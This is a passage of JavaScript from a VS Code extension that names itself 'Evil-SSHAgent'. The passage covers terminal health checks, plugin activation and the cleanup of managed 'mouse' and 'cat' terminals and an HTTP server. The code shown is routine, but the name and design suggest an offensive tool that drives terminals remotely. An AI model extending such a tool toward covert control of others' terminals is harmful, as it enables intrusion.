						setTerminalReferences(terminalManager, mouseTerminalId);
						logger.info(`Mouse终端重新创建成功 [ID: ${mouseTerminalId}]`);
					}
				}
				
				// 检查cat终端
				if (!catTerminalId || !managedTerminals.get(String(catTerminalId))) {
					logger.warn('Cat终端健康检查失败，重新创建...', {
						catTerminalId,
						hasManagedTerminal: !!managedTerminals.get(String(catTerminalId))
					});
					catTerminalId = await createLocalTerminal('cat', true);
					logger.info(`Cat终端重新创建成功 [ID: ${catTerminalId}]`);
				} else {
					// 深度检查：验证终端是否在VS Code中真实存在
					const catTerminalInfo = managedTerminals.get(String(catTerminalId));
					logger.debug('Cat终端健康检查详情', {
						terminalId: catTerminalId,
						hasTerminalInfo: !!catTerminalInfo,
						hasTerminal: !!(catTerminalInfo && catTerminalInfo.terminal)
					});
					
					if (catTerminalInfo && isTerminalAliveInVSCode(catTerminalInfo.terminal)) {
						logger.info('Cat终端健康检查通过');
					} else {
						logger.warn('Cat终端在VS Code中不存在，重新创建...', {
							terminalId: catTerminalId,
							hasTerminalInfo: !!catTerminalInfo,
							terminalAlive: catTerminalInfo ? isTerminalAliveInVSCode(catTerminalInfo.terminal) : false
						});
						catTerminalId = await createLocalTerminal('cat', true);
						logger.info(`Cat终端重新创建成功 [ID: ${catTerminalId}]`);
					}
				}
				
				logger.info('终端健康检查完成');
			} catch (error) {
				logger.error('终端健康检查失败:', error);
			}
		}, 60000); // 60秒检查一次，减少频率
		
		logger.info('✓ 终端健康检查机制已启动');
	}
	
	function stopTerminalHealthCheck() {
		if (terminalHealthCheckInterval) {
			clearInterval(terminalHealthCheckInterval);
			terminalHealthCheckInterval = null;
			console.log('✓ 终端健康检查机制已停止');
		}
	}

	// 启动插件初始化 - 修复：等待初始化完成
	logger.info('=== 开始插件激活流程 ===');
	
	// 首先从持久化存储恢复终端ID
	logger.info('步骤0: 从持久化存储恢复终端ID...');
	logger.info('调试日志文件路径', { 
		debugLogPath: logger.getLogFilePath(),
		debugLogDir: logger.getLogDirPath()
	});
	restoreTerminalIdsFromState();
	
	try {
		await initializePlugin();
		// 初始化完成后启动健康检查
		startTerminalHealthCheck();
		console.log('✅ 插件完全激活完成');
	} catch (error) {
		console.error('❌ 插件激活失败:', error);
		vscode.window.showErrorMessage('插件激活失败: ' + error.message);
		// 即使初始化失败，也要确保基本功能可用
		console.log('⚠️ 插件将以降级模式运行');
	}

	// 添加停用时的清理函数
	const cleanupDisposable = {
		dispose: () => {
			console.log('=== 开始清理插件资源 ===');
			
			// 停止终端健康检查
			stopTerminalHealthCheck();
			
			// 停止HTTP服务器
			if (server) {
				server.close(() => {
					console.log('HTTP服务器已停止');
				});
				server = null;
			}
			
			// 清理终端引用和状态
			mouseTerminalId = null;
			catTerminalId = null;
			terminalsInitialized = false;
			
			console.log('Evil-SSHAgent扩展已停用');
		}
	};
	context.subscriptions.push(cleanupDisposable);
}

// This method is called when your extension is deactivated
async function deactivate() {
    console.log('=== Evil-SSHAgent扩展停用，开始清理资源 ===');
    
    // 清理所有管理的终端
    if (terminalManager.getTerminalCount() > 0) {
        console.log(`发现 ${terminalManager.getTerminalCount()} 个管理的终端，开始清理...`);
        const destroyedCount = await terminalManager.destroyAllManagedTerminals();
        console.log(`✓ 已清理 ${destroyedCount} 个终端`);
    }
    
    // 停止HTTP服务器
    if (server) {
        server.close(() => {
            console.log('HTTP服务器已停止');
        });
        server = null;
    }
    
    console.log('✓ Evil-SSHAgent扩展已停用，所有资源已清理');
}

module.exports = {
	activate,
	deactivate
}